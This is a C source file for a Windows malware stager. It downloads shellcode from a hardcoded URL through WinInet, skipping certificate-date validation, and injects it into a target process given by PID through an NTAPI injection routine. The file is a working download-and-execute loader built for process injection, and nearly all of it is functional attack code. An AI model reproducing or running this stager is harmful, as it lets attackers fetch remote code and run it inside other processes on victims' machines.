#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <WinInet.h>
#include <Shlwapi.h>
#include <psapi.h>
#include "injection.h"

#pragma comment (lib, "Wininet.lib")
#pragma comment(lib, "Shlwapi.lib")



/*
 __          __  _        _____ _
 \ \        / / | |      / ____| |
  \ \  /\  / /__| |__   | (___ | |_ __ _  __ _  ___ _ __
   \ \/  \/ / _ \ '_ \   \___ \| __/ _` |/ _` |/ _ \ '__|
    \  /\  /  __/ |_) |  ____) | || (_| | (_| |  __/ |
     \/  \/ \___|_.__/  |_____/ \__\__,_|\__, |\___|_|
                                          __/ |
                                         |___/
*/

// URL where the payload is hosted
#define PAYLOAD L"http://127.0.0.1:8080/shellcode.bin"

// Function to get a file's payload from a URL
BOOL GetPayloadFromUrl(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize) {
    BOOL bSTATE = TRUE;
    HINTERNET hInternet = NULL, hInternetFile = NULL; // handles for the internet session and the url 
    DWORD dwBytesRead = 0, dwFileSize = 0; // how many bytes are being read and the size of the file
    SIZE_T sSize = 0; // Total payload size
    PBYTE pBytes = NULL; // Buffer we the payload will be stored 

    // Initialize the Internet session, also use the PRECONFIG to make sure that it automates the network configuration setup instead of trying to use proxies for now.
    hInternet = InternetOpenW(L"LemmeGetThat", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (hInternet == NULL) {
        printf("[!] InternetOpenW Failed With Error: %d \n", GetLastError());
        bSTATE = FALSE; goto _EndOfFunction;
    }

    // Open the file handle to the URL, also specify that its a hyperlink and to ignore invalid ssl 
    hInternetFile = InternetOpenUrlW(hInternet, szUrl, NULL, 0, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, 0);
    if (hInternetFile == NULL) {
        printf("[!] InternetOpenUrlW Failed With Error: %d \n", GetLastError());
        bSTATE = FALSE; goto _EndOfFunction;
    }

    // Try to get the file size, querying the length of the file and making sure it returns a numeric value. 
    dwFileSize = (DWORD)-1;
    DWORD dwSize = sizeof(dwFileSize); // when dwFileSize is updated with the length then dw size reads size in bytes 
    HttpQueryInfoW(hInternetFile, HTTP_QUERY_CONTENT_LENGTH | HTTP_QUERY_FLAG_NUMBER, &dwFileSize, &dwSize, NULL);

    if (dwFileSize == (DWORD)-1) {
        printf("[!] Unable to determine file size.\n");
        dwFileSize = 1024 * 1024; // Default to 1MB if size is unknown
    }

    // Allocate buffer for the entire file
    // LPTR: Combines LMEM_FIXED and LMEM_ZEROINIT, which means the allocated memory is initialized to zero. then brings in the filesize
    // The PBYTE type defines a pointer to an 8-bit data type (BYTE). The dwFileSize variable specifies the number of bytes to allocate, and PBYTE is used to point to this block of memory.
    pBytes = (PBYTE)LocalAlloc(LPTR, dwFileSize);
    if (pBytes == NULL) {
        printf("[!] LocalAlloc Failed With Error: %d \n", GetLastError());
        bSTATE = FALSE; goto _EndOfFunction;
    }

    // Read the file data
    while (TRUE) {
        if (!InternetReadFile(hInternetFile, pBytes + sSize, dwFileSize - sSize, &dwBytesRead)) {
            printf("[!] InternetReadFile Failed With Error: %d \n", GetLastError());
            bSTATE = FALSE; goto _EndOfFunction;
        }

        sSize += dwBytesRead;

        // Break loop if end of file
        if (dwBytesRead == 0) break;
    }

    // Assign output parameters
    *pPayloadBytes = pBytes;
    *sPayloadSize = sSize;


    // since it has now 

_EndOfFunction:
    // Cleanup
    if (hInternet) InternetCloseHandle(hInternet);
    if (hInternetFile) InternetCloseHandle(hInternetFile);
    if (!bSTATE && pBytes) LocalFree(pBytes); // Cleanup in case of failure
    return bSTATE;
}


/*
  __  __       _
 |  \/  |     (_)
 | \  / | __ _ _ _ __
 | |\/| |/ _` | | '_ \
 | |  | | (_| | | | | |
 |_|  |_|\__,_|_|_| |_|


*/

int main(int argc, char* argv[]) {



    SIZE_T Size = 0;
    PBYTE Bytes = NULL;



    // Get payload from the URL
    if (!GetPayloadFromUrl(PAYLOAD, &Bytes, &Size)) {
        printf("[!] Failed to retrieve payload from URL.\n");
        return EXIT_FAILURE;
    }

    printf("[i] Payload Retrieved Successfully.\n");
    printf("[i] Size  : %zu bytes\n", Size);

    // Print banner 
    PrintBanner();

    if (argc < 2) {
        printf("[!] Usage: \"%s\" [PID]\n", argv[0]);
        return EXIT_FAILURE;
    }

    // Convert PID from command-line arguments
    DWORD PID = (DWORD)atoi(argv[1]);

    // Attempt to inject the payload
    if (!NTAPIInjection(PID, Bytes, Size)) {
        printf("[!] Injection with NTAPI failed, exiting...\n");
        LocalFree(Bytes);
        return EXIT_FAILURE;
    }

    printf("[+] Successfully injected process with NTAPI!\n");

    // Cleanup
    LocalFree(Bytes);
    return EXIT_SUCCESS;
}